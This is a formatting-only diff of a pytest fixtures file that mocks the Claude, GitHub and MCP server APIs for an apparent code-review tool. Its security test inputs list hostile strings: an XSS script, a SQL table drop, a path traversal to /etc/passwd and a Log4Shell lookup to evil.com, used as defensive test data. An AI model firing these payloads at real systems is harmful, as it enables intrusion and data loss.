@@ -154,7 +154,7 @@ def mock_claude_api():
     """Mock Claude API responses"""
     mock_response = {
         "content": [{"text": "This is a mock Claude API response for testing."}],
-        "usage": {"input_tokens": 100, "output_tokens": 50}
+        "usage": {"input_tokens": 100, "output_tokens": 50},
     }
     with patch("anthropic.Anthropic") as mock_claude:
         mock_claude.return_value.messages.create.return_value = mock_response
@@ -164,12 +164,12 @@ def mock_claude_api():
 @pytest.fixture
 def temp_test_file():
     """Create temporary file for testing"""
-    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.py') as f:
+    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".py") as f:
         f.write("# Test file content\nprint('Hello, World!')")
         temp_path = f.name
-    
+
     yield temp_path
-    
+
     # Cleanup
     if os.path.exists(temp_path):
         os.remove(temp_path)
@@ -186,10 +186,18 @@ def temp_test_directory():
 def mock_mcp_server():
     """Mock MCP server for testing"""
     mock_server = MagicMock()
-    mock_server.list_tools = AsyncMock(return_value=[
-        {"name": "analyze_text_demo", "description": "Analyze text for anti-patterns"},
-        {"name": "vibe_check_mentor", "description": "Collaborative reasoning mentor"}
-    ])
+    mock_server.list_tools = AsyncMock(
+        return_value=[
+            {
+                "name": "analyze_text_demo",
+                "description": "Analyze text for anti-patterns",
+            },
+            {
+                "name": "vibe_check_mentor",
+                "description": "Collaborative reasoning mentor",
+            },
+        ]
+    )
     return mock_server
 
 
@@ -229,7 +237,7 @@ def security_test_inputs():
             "<script>alert('xss')</script>",
             "'; DROP TABLE users; --",
             "../../../etc/passwd",
-            "${jndi:ldap://evil.com/a}"
+            "${jndi:ldap://evil.com/a}",
         ],
         "large_inputs": "A" * 100000,  # 100KB input
         "special_characters": "αβγδε✓✗♠♣♥♦",
@@ -242,13 +250,17 @@ def performance_test_data():
     """Performance testing data sets"""
     return {
         "small_pr": "+" * 1000,  # 1KB diff
-        "medium_pr": "+" * 50000,  # 50KB diff  
+        "medium_pr": "+" * 50000,  # 50KB diff
         "large_pr": "+" * 500000,  # 500KB diff
         "many_files": [f"file_{i}.py" for i in range(100)],
         "complex_analysis": {
-            "issues": [f"Issue {i} with complex analysis requirements" for i in range(50)],
-            "nested_patterns": ["custom " * i + "implementation" for i in range(10, 100, 10)]
-        }
+            "issues": [
+                f"Issue {i} with complex analysis requirements" for i in range(50)
+            ],
+            "nested_patterns": [
+                "custom " * i + "implementation" for i in range(10, 100, 10)
+            ],
+        },
     }
 
 
@@ -270,21 +282,21 @@ def edge_case_scenarios():
 def mock_external_services():
     """Mock external service dependencies"""
     mocks = {}
-    
+
     # Mock GitHub API
     with patch("github.Github") as mock_github:
         mocks["github"] = mock_github
-        
-        # Mock Anthropic API  
+
+        # Mock Anthropic API
         with patch("anthropic.Anthropic") as mock_claude:
             mocks["claude"] = mock_claude
-            
+
             # Mock subprocess calls (for Claude CLI)
             with patch("subprocess.run") as mock_subprocess:
                 mocks["subprocess"] = mock_subprocess
                 mock_subprocess.return_value.returncode = 0
                 mock_subprocess.return_value.stdout = "Mock CLI output"
-                
+
                 yield mocks
 
 
@@ -293,9 +305,9 @@ def setup_test_logging():
     """Setup logging configuration for tests"""
     logging.basicConfig(
         level=logging.DEBUG,
-        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     )
-    
+
     # Suppress noisy third-party logs during testing
     logging.getLogger("urllib3").setLevel(logging.WARNING)
     logging.getLogger("github").setLevel(logging.WARNING)
@@ -307,7 +319,7 @@ def test_config():
     """Test configuration settings"""
     return {
         "github_token": "test_token",
-        "claude_api_key": "test_claude_key", 
+        "claude_api_key": "test_claude_key",
         "test_repository": "test/repo",
         "timeout_seconds": 30,
         "max_retries": 3,
@@ -340,7 +352,7 @@ def anti_pattern_examples():
             "couldn't find how to use the API",
             "documentation wasn't clear",
             "had to figure it out myself",
-        ]
+        ],
     }
 
 
@@ -362,5 +374,5 @@ def good_pattern_examples():
             "complex requirements demand this approach",
             "performance critical path needs optimization",
             "security requirements mandate custom solution",
-        ]
+        ],
     }
